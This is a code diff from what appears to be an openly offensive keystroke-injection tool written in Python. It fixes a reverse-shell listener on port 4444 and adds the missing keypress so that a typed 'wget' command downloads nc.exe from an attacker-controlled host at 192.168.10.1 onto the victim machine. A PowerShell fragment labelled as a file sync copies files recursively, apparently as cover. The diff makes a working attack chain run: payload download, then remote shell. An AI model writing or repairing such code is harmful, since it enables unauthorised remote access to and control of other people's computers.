@@ -15,8 +15,8 @@ Get-ChildItem -Path $target -Recurse -Include *  | Copy-Item -Destination $desti
 Write-Host "The file sync is complete." """
 
 def reverse_shell_listener():
-	s = socket.socket(AF_INET, SOCK_STREAM) # Create our socket handler.
-	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create our socket handler.
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) ;# Set is so that when we cancel out we can reuse port.
 	try:
 		s.bind(('', 4444)) # Bind to interface.
 		print("[*] Listening on 0.0.0.0:4444") # Print we are accepting connections.
@@ -46,6 +46,7 @@ def payload():
 	eco.press("ENTER")
 	sleep(1)
 	eco.type("wget http://192.168.10.1:8000/nc.exe -OutFile nc.exe")
+	eco.press("ENTER")
 	sleep(5)
 
 	shelllistener=Process(target=reverse_shell_listener)
